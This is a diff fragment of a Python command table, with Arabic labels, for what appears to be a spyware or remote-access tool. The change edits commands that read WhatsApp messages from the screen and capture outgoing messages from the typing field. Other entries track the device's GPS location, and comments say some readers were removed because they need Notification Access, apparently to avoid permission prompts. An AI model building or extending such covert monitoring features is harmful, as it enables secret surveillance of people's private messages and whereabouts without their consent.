@@ -219,8 +219,8 @@ COMMANDS = {
     # ⚠️ gmail تمت إزالته — يحتاج Notification Access
     # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
     "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
-    "whatsapp-monitor-on":  {"category": "data", "label": "👁️ تفعيل مراقبة واتساب", "description": "مراقبة دائمة لرسائل واتساب", "needs_param": False},
-    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة واتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
+    "whatsapp-monitor-on":  {"category": "data", "label": "📤 مراقبة واتساب الصادرة", "description": "قراءة الرسائل الصادرة من حقل الكتابة", "needs_param": False},
+    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة الصادرة", "description": "إيقاف مراقبة الرسائل الصادرة", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
